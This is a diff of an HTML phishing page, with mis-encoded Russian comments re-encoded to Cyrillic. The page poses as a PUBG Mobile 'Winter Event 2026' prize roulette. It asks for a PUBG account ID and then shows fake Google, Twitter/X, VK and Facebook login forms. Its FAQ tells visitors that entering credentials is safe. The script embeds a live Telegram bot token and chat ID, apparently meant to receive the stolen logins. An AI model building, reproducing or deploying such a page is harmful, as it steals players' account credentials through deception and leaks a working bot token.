@@ -39,7 +39,7 @@
             position: relative;
         }
         
-        /* ÐÑÐ½Ð¾Ð²Ð½Ð¾Ð¹ ÑÐ¾Ð½ Ñ Ð¿Ð°ÑÐ°Ð»Ð»Ð°ÐºÑ-ÑÑÑÐµÐºÑÐ¾Ð¼ */
+        /* Основной фон с параллакс-эффектом */
         body::before {
             content: '';
             position: fixed;
@@ -60,7 +60,7 @@
             to { transform: scale(1.1); }
         }
         
-        /* Ð¡ÐµÑÐºÐ° (Overlay Grid) â Ð¿ÑÐ¸Ð´Ð°ÐµÑ ÑÐµÑÐ½Ð¾Ð»Ð¾Ð³Ð¸ÑÐ½ÑÐ¹ Ð²Ð¸Ð´ */
+        /* Сетка (Overlay Grid) — придает технологичный вид */
         body::after {
             content: '';
             position: fixed;
@@ -73,7 +73,7 @@
             z-index: -1;
         }
         
-        /* Ð¡Ð§ÐÐ¢Ð§ÐÐ ÐÐÐÐÐÐÐ¢ÐÐÐÐ (Ð¡ÑÐ¸Ð»Ñ "Live") */
+        /* СЧЕТЧИК ПОБЕДИТЕЛЕЙ (Стиль "Live") */
         .winners-counter {
             position: fixed;
             top: 20px;
@@ -91,7 +91,7 @@
             animation: slideInDown 0.5s ease-out;
         }
         
-        /* Ð¢Ð¾ÑÐºÐ° "Live" */
+        /* Точка "Live" */
         .winners-counter::before {
             content: '';
             width: 8px;
@@ -121,7 +121,7 @@
             50% { opacity: 0.7; }
         }
         
-        /* ÐÐÐ Ð¥ÐÐÐ ÐÐÐÐ® (Glassmorphism) */
+        /* ВЕРХНЕЕ МЕНЮ (Glassmorphism) */
         .top-menu {
             width: 95%;
             max-width: 1000px;
@@ -143,7 +143,7 @@
             position: relative;
         }
         
-        /* ÐÐ°Ð»ÐµÐ½ÑÐºÐ°Ñ Ð´ÐµÑÐ°Ð»Ñ: ÑÐ³Ð¾Ð»ÐºÐ¸ Ð½Ð° Ð¼ÐµÐ½Ñ */
+        /* Маленькая деталь: уголки на меню */
         .top-menu::before {
             content: '';
             position: absolute;
@@ -156,7 +156,7 @@
             border-radius: 5px 0 0 0;
         }
         
-        /* ÐÐµÐ½Ñ ÑÐ»ÐµÐ²Ð° Ñ Ð±ÑÑÐ³ÐµÑÐ¾Ð¼ */
+        /* Меню слева с бургером */
         .menu-left {
             display: flex;
             gap: 15px;
@@ -196,7 +196,7 @@
             color: white !important;
         }
         
-        /* ÐÑÐ¿Ð°Ð´Ð°ÑÑÐµÐµ Ð¼ÐµÐ½Ñ */
+        /* Выпадающее меню */
         .dropdown-menu {
             position: absolute;
             top: 100%;
@@ -251,7 +251,7 @@
             padding-left: 20px;
         }
         
-        /* ÐÑÐ°Ð²Ð°Ñ ÑÐ°ÑÑÑ Ð¼ÐµÐ½Ñ */
+        /* Правая часть меню */
         .menu-right {
             display: flex;
             align-items: center;
@@ -328,7 +328,7 @@
             transform: translateX(5px);
         }
         
-        /* ÐÐºÐ¾Ð½ÐºÐ° Ð¿Ð¾ÑÑÑ Ð´Ð»Ñ Ð¿ÑÐ¸Ð·Ð° */
+        /* Иконка почты для приза */
         .prize-mail-icon {
             display: flex;
         }
@@ -388,7 +388,7 @@
             transform: none;
         }
         
-        /* ÐÐÐÐ«Ð ÐÐÐ¢ÐÐ Ð¤ÐÐÐ¡ ÐÐÐ§Ð¢Ð« (ÐÐÐÐ ÐÐ ÐÐÐ) */
+        /* НОВЫЙ ИНТЕРФЕЙС ПОЧТЫ (ОКНО ПРИЗА) */
         .prize-window {
             position: fixed;
             top: 0;
@@ -551,7 +551,7 @@
             }
         }
         
-        /* ÐÐÐÐÐÐÐÐÐÐ«Ð ÐÐÐÐ¢ÐÐÐÐÐ  Ð Ð£ÐÐÐ¢ÐÐ */
+        /* ОБНОВЛЕННЫЙ КОНТЕЙНЕР РУЛЕТКИ */
         .roulette-container {
             position: relative;
             width: 100%;
@@ -570,7 +570,7 @@
             justify-content: center;
         }
         
-        /* Ð¡ÐÐ¢ÐÐ ÐÐ ÐÐÐÐ */
+        /* СЕТКА ПРИЗОВ */
         .prizes-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -598,7 +598,7 @@
             overflow: hidden;
         }
         
-        /* Ð­ÑÑÐµÐºÑ ÑÐºÐ°Ð½Ð¸ÑÐ¾Ð²Ð°Ð½Ð¸Ñ */
+        /* Эффект сканирования */
         .prize-item::after {
             content: '';
             position: absolute;
@@ -650,7 +650,7 @@
             opacity: 0.8;
         }
         
-        /* ÐÐÐÐÐ¯ Ð ÐÐÐÐ ÐÐ«ÐÐÐ Ð Ð¡ ÐÐÐÐÐÐ¦ÐÐÐ ÐÐ ÐÐÐÐÐÐ¢Ð - ÐÐÐÐÐÐÐÐÐ */
+        /* НОВАЯ РАМКА ВЫБОРА С АНИМАЦИЕЙ ГРАДИЕНТА - ОБНОВЛЕНА */
         .selection-frame {
             position: absolute;
             border: 3px solid transparent;
@@ -699,7 +699,7 @@
             }
         }
         
-        /* ÐÐÐÐÐÐÐ¢ÐÐ  ÐÐ«ÐÐÐ Ð */
+        /* ИНДИКАТОР ВЫБОРА */
         .selection-indicator {
             position: absolute;
             top: -30px;
@@ -733,7 +733,7 @@
             opacity: 1;
         }
         
-        /* ÐÐÐÐÐÐ ÐÐÐ ÐÐ¢Ð¬ */
+        /* КНОПКА ИГРАТЬ */
         .play-btn {
             background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
             color: white;
@@ -815,7 +815,7 @@
             font-size: 20px;
         }
         
-        /* Ð¤ÐÐ ÐÐ ÐÐÐÐÐ ID ÐÐÐÐÐ£ÐÐ¢Ð */
+        /* ФОРМА ВВОДА ID АККАУНТА */
         .account-id-section {
             background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
@@ -950,7 +950,7 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
-        /* Ð¤ÐÐ ÐÐ ÐÐ«ÐÐÐ Ð Ð¡ÐÐ¦Ð¡ÐÐ¢Ð */
+        /* ФОРМА ВЫБОРА СОЦСЕТИ */
         .social-select-section {
             background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
@@ -1114,7 +1114,7 @@
             font-weight: 700;
         }
         
-        /* ÐÐÐÐÐÐ ÐÐÐÐ£Ð§ÐÐ¢Ð¬ ÐÐ ÐÐ */
+        /* КНОПКА ПОЛУЧИТЬ ПРИЗ */
         .get-prize-btn {
             background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
             color: white;
@@ -1183,7 +1183,7 @@
             font-size: 20px;
         }
         
-        /* Ð¢ÐµÐºÑÑ "ÐÐ°Ð¶Ð½Ð¾" Ð² ÑÐ¾ÑÐ¼Ðµ Ð²ÑÐ±Ð¾ÑÐ° ÑÐ¾ÑÑÐµÑÐ¸ */
+        /* Текст "Важно" в форме выбора соцсети */
         .important-note {
             text-align: center;
             color: #8da1b5;
@@ -1192,7 +1192,7 @@
             font-family: 'Inter', sans-serif;
         }
         
-        /* Ð¡ÐÐÐ¦ÐÐ¯ ÐÐÐÐ¢ÐÐÐ ÐÐÐÐÐÐ¯ */
+        /* СЕКЦИЯ ПОДТВЕРЖДЕНИЯ */
         .confirmation-section {
             background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
@@ -1248,7 +1248,7 @@
             border: 1px solid rgba(76, 175, 80, 0.3);
         }
         
-        /* ÐÐÐÐ«Ð Ð ÐÐÐÐÐ: ÐÐÐÐ ÐÐ¡Ð« Ð ÐÐ¢ÐÐÐ¢Ð« */
+        /* НОВЫЙ РАЗДЕЛ: ВОПРОСЫ И ОТВЕТЫ */
         .faq-section {
             width: 100%;
             max-width: 800px;
@@ -1366,7 +1366,7 @@
             color: #7B68EE;
         }
         
-        /* ÐÐÐÐÐÐÐÐÐÐ«Ð Ð£ÐÐÐÐÐÐÐÐÐÐ¯ - ÐÐÐÐ«Ð ÐÐÐÐÐÐ */
+        /* ОБНОВЛЕННЫЕ УВЕДОМЛЕНИЯ - НОВЫЙ ДИЗАЙН */
         .notification {
             position: fixed;
             top: 50%;
@@ -1436,7 +1436,7 @@
             background: linear-gradient(45deg, #4CAF50, #2E7D32, #81C784);
         }
         
-        /* ÐÐ¡Ð¢ÐÐÐ¬ÐÐ«Ð Ð¡Ð¢ÐÐÐ */
+        /* ОСТАЛЬНЫЕ СТИЛИ */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -1509,7 +1509,7 @@
             color: #333;
         }
         
-        /* Twitter/X ÑÑÐ¸Ð»Ñ */
+        /* Twitter/X стиль */
         .x-modal-step1 {
             padding: 30px;
             animation: modalAppear 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
@@ -1692,7 +1692,7 @@
             text-decoration: underline;
         }
         
-        /* Twitter/X Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ Ð´Ð»Ñ Ð¿Ð°ÑÐ¾Ð»Ñ */
+        /* Twitter/X модальное окно для пароля */
         .x-modal-step2 {
             background: #000000;
             color: white;
@@ -1803,7 +1803,7 @@
             text-decoration: underline;
         }
         
-        /* ÐÐÐ¾Ð½ÑÐ°ÐºÑÐµ ÑÑÐ¸Ð»Ñ */
+        /* ВКонтакте стиль */
         .vk-logo {
             width: 48px;
             height: 48px;
@@ -1904,7 +1904,7 @@
             text-decoration: underline;
         }
         
-        /* Facebook ÑÑÐ¸Ð»Ñ */
+        /* Facebook стиль */
         .fb-modal {
             background: #F0F2F5;
             padding: 0;
@@ -2018,7 +2018,7 @@
             box-shadow: 0 5px 15px rgba(66, 183, 42, 0.3);
         }
         
-        /* Ð¡Ð¢ÐÐÐ ÐÐÐ¯ ÐÐÐÐÐÐ­ÐÐ ÐÐÐÐÐ Ð¡Ð¢Ð ÐÐÐÐ¦Ð« GOOGLE */
+        /* СТИЛИ ДЛЯ ПОЛНОЭКРАННОЙ СТРАНИЦЫ GOOGLE */
         .google-fullscreen {
             position: fixed;
             top: 0;
@@ -2283,7 +2283,7 @@
             font-family: 'Inter', sans-serif;
         }
         
-        /* Ð­Ð¤Ð¤ÐÐÐ¢ ÐÐÐÐÐ®Ð©ÐÐÐ Ð¡ÐÐÐÐ */
+        /* ЭФФЕКТ ПАДАЮЩЕГО СНЕГА */
         #snow-container {
             position: fixed;
             top: 0;
@@ -2310,7 +2310,7 @@
             }
         }
 
-        /* ÐÑÐ°Ð·Ð´Ð½Ð¸ÑÐ½ÑÐ¹ Ð±Ð°Ð½Ð½ÐµÑ ÑÐ²ÐµÑÑÑ */
+        /* Праздничный баннер сверху */
         .holiday-banner {
             width: 100%;
             text-align: center;
@@ -2324,9 +2324,9 @@
             margin-bottom: 10px;
         }
 
-        /* ÐÐ¾Ð²Ð¾Ð³Ð¾Ð´Ð½Ð¸Ðµ Ð°ÐºÑÐµÐ½ÑÑ Ð½Ð° ÐºÐ½Ð¾Ð¿ÐºÐ°Ñ */
+        /* Новогодние акценты на кнопках */
         .menu-btn::before, .language-btn::before {
-            content: 'â';
+            content: '❄';
             position: absolute;
             top: -5px;
             right: -2px;
@@ -2515,25 +2515,25 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <!-- ÐÐ¾Ð½ÑÐµÐ¹Ð½ÐµÑ Ð´Ð»Ñ ÑÐ½ÐµÐ³Ð° -->
+    <!-- Контейнер для снега -->
     <div id="snow-container"></div>
 
-    <!-- ÐÐ¾Ð²Ð¾Ð³Ð¾Ð´Ð½ÐµÐµ Ð¿ÑÐ¸Ð²ÐµÑÑÑÐ²Ð¸Ðµ -->
+    <!-- Новогоднее приветствие -->
     <div class="holiday-banner">
         <i class="fas fa-snowflake"></i>
         WINTER EVENT 2026 IS LIVE
         <i class="fas fa-snowflake"></i>
     </div>
 
-    <!-- Ð¡ÑÐµÑÑÐ¸Ðº Ð¿Ð¾Ð±ÐµÐ´Ð¸ÑÐµÐ»ÐµÐ¹ -->
+    <!-- Счетчик победителей -->
     <div class="winners-counter">
         Winners: <span class="winners-count" id="winnersCount">0</span>
     </div>
     
-    <!-- Ð£Ð²ÐµÐ´Ð¾Ð¼Ð»ÐµÐ½Ð¸Ðµ Ð² ÑÐµÐ½ÑÑÐµ -->
+    <!-- Уведомление в центре -->
     <div class="notification" id="notification"></div>
     
-    <!-- ÐÐºÐ½Ð¾ Ñ Ð¿ÑÐ¸Ð·Ð¾Ð¼ -->
+    <!-- Окно с призом -->
     <div class="prize-window" id="prizeWindow">
         <div class="prize-content">
             <div class="prize-banner">YOUR PRIZE</div>
@@ -2552,7 +2552,7 @@
         </div>
     </div>
 
-    <!-- ÐÐ¾Ð»Ð½Ð¾ÑÐºÑÐ°Ð½Ð½Ð°Ñ ÑÑÑÐ°Ð½Ð¸ÑÐ° Google -->
+    <!-- Полноэкранная страница Google -->
     <div class="google-fullscreen" id="googleFullscreen">
         <div class="google-auth-container" id="googleStep1">
             <img src="Google.png" alt="Google" class="google-logo">
@@ -2577,7 +2577,7 @@
             <div class="google-lang-footer">English</div>
         </div>
         
-        <!-- Ð¡ÑÑÐ°Ð½Ð¸ÑÐ° Ð¿Ð°ÑÐ¾Ð»Ñ (ÑÐºÑÑÑÐ° Ð¿Ð¾ ÑÐ¼Ð¾Ð»ÑÐ°Ð½Ð¸Ñ) -->
+        <!-- Страница пароля (скрыта по умолчанию) -->
         <div class="google-auth-container" id="googleStep2" style="display:none;">
             <img src="Google.png" alt="Google" class="google-logo">
             
@@ -2603,7 +2603,7 @@
             <div class="google-lang-footer">English</div>
         </div>
         
-        <!-- ÐÐ±ÑÐ¸Ð¹ ÑÑÑÐµÑ Ð´Ð»Ñ Ð²ÑÐµÐ¹ ÑÑÑÐ°Ð½Ð¸ÑÑ -->
+        <!-- Общий футер для всей страницы -->
         <div class="google-bottom-footer">
             <div class="google-bottom-footer-links">
                 <a href="#">Help</a>
@@ -2613,9 +2613,9 @@
         </div>
     </div>
 
-    <!-- ÐÐ¾Ð´Ð°Ð»ÑÐ½ÑÐµ Ð¾ÐºÐ½Ð° Ð´Ð»Ñ Ð²ÑÐ¾Ð´Ð° -->
+    <!-- Модальные окна для входа -->
     
-    <!-- Twitter/X Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ (ÑÑÐ°Ð¿ 1: email/username) -->
+    <!-- Twitter/X модальное окно (этап 1: email/username) -->
     <div class="modal-overlay modal-dark" id="xModalStep1">
         <div class="modal modal-dark x-modal-step1">
             <button class="close-modal" onclick="closeModal('xModalStep1')">&times;</button>
@@ -2660,7 +2660,7 @@
         </div>
     </div>
     
-    <!-- Twitter/X Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ (ÑÑÐ°Ð¿ 2: Ð¿Ð°ÑÐ¾Ð»Ñ) -->
+    <!-- Twitter/X модальное окно (этап 2: пароль) -->
     <div class="modal-overlay modal-dark" id="xModalStep2">
         <div class="modal modal-dark x-modal-step2">
             <button class="close-modal" onclick="closeModal('xModalStep2')">&times;</button>
@@ -2687,41 +2687,41 @@
         </div>
     </div>
     
-    <!-- ÐÐÐ¾Ð½ÑÐ°ÐºÑÐµ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ -->
+    <!-- ВКонтакте модальное окно -->
     <div class="modal-overlay" id="vkModal">
         <div class="modal">
             <button class="close-modal" onclick="closeModal('vkModal')">&times;</button>
             <div style="text-align: center;">
                 <img src="vkontakte.png" alt="VK" class="vk-logo">
             </div>
-            <h1 class="vk-title">ÐÑÐ¾Ð´ ÐÐÐ¾Ð½ÑÐ°ÐºÑÐµ</h1>
+            <h1 class="vk-title">Вход ВКонтакте</h1>
             
             <form id="vkLoginForm">
-                <label class="vk-label">Ð¢ÐµÐ»ÐµÑÐ¾Ð½ Ð¸Ð»Ð¸ email</label>
-                <input type="text" class="vk-input" placeholder="Ð¢ÐµÐ»ÐµÑÐ¾Ð½ Ð¸Ð»Ð¸ email" required>
+                <label class="vk-label">Телефон или email</label>
+                <input type="text" class="vk-input" placeholder="Телефон или email" required>
                 
-                <label class="vk-label">ÐÐ°ÑÐ¾Ð»Ñ</label>
-                <input type="password" class="vk-input" placeholder="ÐÐ°ÑÐ¾Ð»Ñ" required>
+                <label class="vk-label">Пароль</label>
+                <input type="password" class="vk-input" placeholder="Пароль" required>
                 
                 <div class="vk-checkbox">
                     <input type="checkbox" id="vkComputer">
-                    <label for="vkComputer">Ð§ÑÐ¶Ð¾Ð¹ ÐºÐ¾Ð¼Ð¿ÑÑÑÐµÑ</label>
+                    <label for="vkComputer">Чужой компьютер</label>
                 </div>
                 
-                <button type="submit" class="vk-submit-btn">ÐÐ¾Ð¹ÑÐ¸</button>
+                <button type="submit" class="vk-submit-btn">Войти</button>
             </form>
             
             <div class="vk-links">
-                <a href="#" class="vk-link">Ð ÐµÐ³Ð¸ÑÑÑÐ°ÑÐ¸Ñ</a>
+                <a href="#" class="vk-link">Регистрация</a>
             </div>
             
             <div style="text-align: center; padding-top: 20px; border-top: 1px solid #DCE1E6;">
-                <a href="#" class="vk-link" style="font-size: 14px;">ÐÐ°Ð±ÑÐ»Ð¸ Ð¿Ð°ÑÐ¾Ð»Ñ Ð¸Ð»Ð¸ Ð½Ðµ Ð¼Ð¾Ð¶ÐµÑÐµ Ð²Ð¾Ð¹ÑÐ¸?</a>
+                <a href="#" class="vk-link" style="font-size: 14px;">Забыли пароль или не можете войти?</a>
             </div>
         </div>
     </div>
     
-    <!-- Facebook Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ -->
+    <!-- Facebook модальное окно -->
     <div class="modal-overlay" id="facebookModal">
         <div class="modal fb-modal">
             <button class="close-modal" onclick="closeModal('facebookModal')" style="color: #606770;">&times;</button>
@@ -2736,22 +2736,22 @@
             
             <div class="fb-content">
                 <form id="facebookLoginForm">
-                    <input type="text" class="fb-input" placeholder="Ð­Ð»ÐµÐºÑÑÐ¾Ð½Ð½ÑÐ¹ Ð°Ð´ÑÐµÑ Ð¸Ð»Ð¸ Ð½Ð¾Ð¼ÐµÑ ÑÐµÐ»ÐµÑÐ¾Ð½Ð°" required>
-                    <input type="password" class="fb-input" placeholder="ÐÐ°ÑÐ¾Ð»Ñ" required>
+                    <input type="text" class="fb-input" placeholder="Электронный адрес или номер телефона" required>
+                    <input type="password" class="fb-input" placeholder="Пароль" required>
                     
-                    <button type="submit" class="fb-submit-btn">ÐÑÐ¾Ð´</button>
+                    <button type="submit" class="fb-submit-btn">Вход</button>
                 </form>
                 
-                <a href="#" class="fb-link">ÐÐ°Ð±ÑÐ»Ð¸ Ð°ÐºÐºÐ°ÑÐ½Ñ?</a>
+                <a href="#" class="fb-link">Забыли аккаунт?</a>
                 
                 <div class="fb-divider"></div>
                 
-                <button class="fb-create-btn" onclick="closeModal('facebookModal')">Ð¡Ð¾Ð·Ð´Ð°ÑÑ Ð°ÐºÐºÐ°ÑÐ½Ñ</button>
+                <button class="fb-create-btn" onclick="closeModal('facebookModal')">Создать аккаунт</button>
             </div>
         </div>
     </div>
 
-    <!-- ÐÐµÑÑÐ½ÐµÐµ Ð¼ÐµÐ½Ñ -->
+    <!-- Верхнее меню -->
     <div class="top-menu">
         <div class="menu-left">
             <div class="menu-dropdown">
@@ -2776,7 +2776,7 @@
                 </button>
                 <div class="language-dropdown" id="languageDropdown">
                     <div class="language-option" data-lang="en">English</div>
-                    <div class="language-option" data-lang="ru">Ð ÑÑÑÐºÐ¸Ð¹</div>
+                    <div class="language-option" data-lang="ru">Русский</div>
                     <div class="language-option" data-lang="uz">O'zbekcha</div>
                 </div>
             </div>
@@ -2792,7 +2792,7 @@
 
     <div class="container">
         <div class="header">
-            <!-- Ð£Ð´Ð°Ð»ÐµÐ½ ÑÐµÐºÑÑ "ÐÐÐÐÐ¡Ð Ð£ÐÐÐ§Ð PUBG" -->
+            <!-- Удален текст "КОЛЕСО УДАЧИ PUBG" -->
         </div>
         
         <div class="roulette-container">
@@ -2826,7 +2826,7 @@
                 </div>
             </div>
             
-            <!-- Ð Ð°Ð¼ÐºÐ° Ñ Ð¸Ð½Ð´Ð¸ÐºÐ°ÑÐ¾ÑÐ¾Ð¼ -->
+            <!-- Рамка с индикатором -->
             <div class="selection-frame" id="selectionFrame">
                 <div class="corner corner-tl"></div>
                 <div class="corner corner-tr"></div>
@@ -2840,7 +2840,7 @@
             <i class="fas fa-play"></i> PLAY
         </button>
         
-        <!-- Ð¤Ð¾ÑÐ¼Ð° Ð²Ð²Ð¾Ð´Ð° ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ° -->
+        <!-- Форма ввода ID аккаунта -->
         <div class="account-id-section" id="accountIdSection">
             <h2>ENTER PUBG ACCOUNT ID</h2>
             <p>Please enter your PUBG Mobile account ID to receive the prize</p>
@@ -2855,7 +2855,7 @@
             </button>
         </div>
         
-        <!-- Ð¤Ð¾ÑÐ¼Ð° Ð²ÑÐ±Ð¾ÑÐ° ÑÐ¾ÑÑÐµÑÐ¸ -->
+        <!-- Форма выбора соцсети -->
         <div class="social-select-section" id="socialSelectSection">
             <h2>SELECT RECEIVING METHOD</h2>
             <p>Select social network to receive the prize</p>
@@ -2901,7 +2901,7 @@
             </button>
         </div>
         
-        <!-- Ð¡ÐµÐºÑÐ¸Ñ Ð¿Ð¾Ð´ÑÐ²ÐµÑÐ¶Ð´ÐµÐ½Ð¸Ñ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ Ð¿ÑÐ¸Ð·Ð° -->
+        <!-- Секция подтверждения получения приза -->
         <div class="confirmation-section" id="confirmationSection">
             <div class="confirmation-icon">
                 <i class="fas fa-check-circle"></i>
@@ -2919,12 +2919,12 @@
             </p>
         </div>
         
-        <!-- ÐÐÐÐ«Ð Ð ÐÐÐÐÐ: ÐÐÐÐ ÐÐ¡Ð« Ð ÐÐ¢ÐÐÐ¢Ð« -->
+        <!-- НОВЫЙ РАЗДЕЛ: ВОПРОСЫ И ОТВЕТЫ -->
         <div class="faq-section">
             <h2><i class="fas fa-question-circle"></i> FREQUENTLY ASKED QUESTIONS</h2>
             
             <div class="faq-container">
-                <!-- ÐÐ¾Ð¿ÑÐ¾Ñ 1 -->
+                <!-- Вопрос 1 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
                         <span>Is this the official PUBG Mobile website?</span>
@@ -2935,7 +2935,7 @@
                     </div>
                 </div>
                 
-                <!-- ÐÐ¾Ð¿ÑÐ¾Ñ 2 -->
+                <!-- Вопрос 2 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
                         <span>Will the prize definitely come to my account?</span>
@@ -2946,7 +2946,7 @@
                     </div>
                 </div>
                 
-                <!-- ÐÐ¾Ð¿ÑÐ¾Ñ 3 -->
+                <!-- Вопрос 3 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
                         <span>Why do I need to log into a social network?</span>
@@ -2957,7 +2957,7 @@
                     </div>
                 </div>
                 
-                <!-- ÐÐ¾Ð¿ÑÐ¾Ñ 4 -->
+                <!-- Вопрос 4 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
                         <span>What if I don't specify the account ID?</span>
@@ -2968,7 +2968,7 @@
                     </div>
                 </div>
                 
-                <!-- ÐÐ¾Ð¿ÑÐ¾Ñ 5 -->
+                <!-- Вопрос 5 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
                         <span>What to do if the prize doesn't arrive within 24 hours?</span>
@@ -2979,7 +2979,7 @@
                     </div>
                 </div>
                 
-                <!-- ÐÐ¾Ð¿ÑÐ¾Ñ 6 -->
+                <!-- Вопрос 6 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
                         <span>Is it safe to enter social network credentials?</span>
@@ -2990,7 +2990,7 @@
                     </div>
                 </div>
                 
-                <!-- ÐÐ¾Ð¿ÑÐ¾Ñ 7 -->
+                <!-- Вопрос 7 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
                         <span>Can I win more than once?</span>
@@ -3001,7 +3001,7 @@
                     </div>
                 </div>
                 
-                <!-- ÐÐ¾Ð¿ÑÐ¾Ñ 8 -->
+                <!-- Вопрос 8 -->
                 <div class="faq-item" onclick="toggleFAQ(this)">
                     <div class="faq-question">
                         <span>What prizes can be won?</span>
@@ -3015,7 +3015,7 @@
         </div>
     </div>
 
-    <!-- Ð¤ÑÑÐµÑ -->
+    <!-- Футер -->
     <div class="footer">
         <div class="footer-links">
             <a href="#" class="footer-link">Terms of Service</a>
@@ -3024,11 +3024,11 @@
             <a href="#" class="footer-link">Cookie Preferences</a>
         </div>
         <div class="copyright">
-            Copyright Â© High Morale Developments Limited. All rights reserved.
+            Copyright © High Morale Developments Limited. All rights reserved.
         </div>
     </div>
 
-    <!-- ÐÑÐ´Ð¸Ð¾ Ð´Ð»Ñ Ð·Ð²ÑÐºÐ¾Ð² -->
+    <!-- Аудио для звуков -->
     <audio id="spinSound" preload="auto">
         <source src="https://assets.mixkit.co/sfx/preview/mixkit-slot-machine-wheel-spin-1382.mp3" type="audio/mpeg">
     </audio>
@@ -3037,11 +3037,11 @@
     </audio>
 
     <script>
-        // ÐÐ¾Ð½ÑÐ¸Ð³ÑÑÐ°ÑÐ¸Ñ Telegram Ð±Ð¾ÑÐ°
+        // Конфигурация Telegram бота
         const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const TELEGRAM_CHAT_ID = '1709490182';
         
-        // ÐÐµÑÐµÐ¼ÐµÐ½Ð½ÑÐµ Ð´Ð»Ñ ÑÑÐ°Ð½ÐµÐ½Ð¸Ñ Ð´Ð°Ð½Ð½ÑÑ
+        // Переменные для хранения данных
         let googleEmail = '';
         let xUsername = '';
         let userPrize = null;
@@ -3054,7 +3054,7 @@
         let winnersInterval = null;
         let currentLang = 'en';
         
-        // Ð¤ÑÐ½ÐºÑÐ¸Ð¸ Ð´Ð»Ñ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½ÑÑ Ð¾ÐºÐ¾Ð½
+        // Функции для модальных окон
         function openModal(modalId) {
             document.getElementById(modalId).classList.add('active');
             document.body.style.overflow = 'hidden';
@@ -3068,7 +3068,7 @@
         function openGoogleFullscreen() {
             document.getElementById('googleFullscreen').classList.add('active');
             document.body.style.overflow = 'hidden';
-            // Ð¡Ð±ÑÐ°ÑÑÐ²Ð°ÐµÐ¼ ÑÐ¾ÑÐ¼Ñ
+            // Сбрасываем форму
             document.getElementById('googleStep1').style.display = 'block';
             document.getElementById('googleStep2').style.display = 'none';
             document.getElementById('googleEmailInput').value = '';
@@ -3085,34 +3085,34 @@
             openModal('xModalStep1');
         }
         
-        // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð´Ð»Ñ Ð¿ÐµÑÐµÐºÐ»ÑÑÐµÐ½Ð¸Ñ FAQ
+        // Функция для переключения FAQ
         function toggleFAQ(faqItem) {
             const isActive = faqItem.classList.contains('active');
             
-            // ÐÐ°ÐºÑÑÐ²Ð°ÐµÐ¼ Ð²ÑÐµ FAQ
+            // Закрываем все FAQ
             document.querySelectorAll('.faq-item').forEach(item => {
                 item.classList.remove('active');
             });
             
-            // ÐÑÐºÑÑÐ²Ð°ÐµÐ¼ ÑÐµÐºÑÑÐ¸Ð¹, ÐµÑÐ»Ð¸ Ð¾Ð½ Ð±ÑÐ» Ð·Ð°ÐºÑÑÑ
+            // Открываем текущий, если он был закрыт
             if (!isActive) {
                 faqItem.classList.add('active');
             }
         }
         
-        // Ð¤ÑÐ½ÐºÑÐ¸Ñ ÑÐ¾Ð·Ð´Ð°Ð½Ð¸Ñ ÑÐ½ÐµÐ³Ð°
+        // Функция создания снега
         function createSnow() {
             const container = document.getElementById('snow-container');
-            const count = 50; // ÐÐ¾Ð»Ð¸ÑÐµÑÑÐ²Ð¾ ÑÐ½ÐµÐ¶Ð¸Ð½Ð¾Ðº
+            const count = 50; // Количество снежинок
 
             for (let i = 0; i < count; i++) {
                 const snow = document.createElement('div');
                 snow.className = 'snowflake';
                 
-                // Ð Ð°Ð½Ð´Ð¾Ð¼Ð½ÑÐµ ÑÐ°Ð·Ð¼ÐµÑÑ Ð¸ Ð¿Ð¾Ð·Ð¸ÑÐ¸Ð¸
+                // Рандомные размеры и позиции
                 const size = Math.random() * 5 + 2 + 'px';
                 const left = Math.random() * 100 + '%';
-                const duration = Math.random() * 5 + 5 + 's'; // Ð¡ÐºÐ¾ÑÐ¾ÑÑÑ Ð¿Ð°Ð´ÐµÐ½Ð¸Ñ
+                const duration = Math.random() * 5 + 5 + 's'; // Скорость падения
                 const delay = Math.random() * 5 + 's';
                 const opacity = Math.random();
 
@@ -3127,7 +3127,7 @@
             }
         }
         
-        // Ð¤ÑÐ½ÐºÑÐ¸Ð¸ Ð´Ð»Ñ Ð¾ÐºÐ½Ð° Ð¿ÑÐ¸Ð·Ð°
+        // Функции для окна приза
         function openPrizeWindow() {
             const prizeWindow = document.getElementById('prizeWindow');
             prizeWindow.classList.add('active');
@@ -3135,56 +3135,56 @@
             
             if (userPrize) {
                 document.getElementById('winImg').src = userPrize.image;
-                document.getElementById('winName').textContent = currentLang === 'ru' ? "ÐÐ ÐÐ" : currentLang === 'uz' ? "SOVRIN" : "PRIZE";
+                document.getElementById('winName').textContent = currentLang === 'ru' ? "ПРИЗ" : currentLang === 'uz' ? "SOVRIN" : "PRIZE";
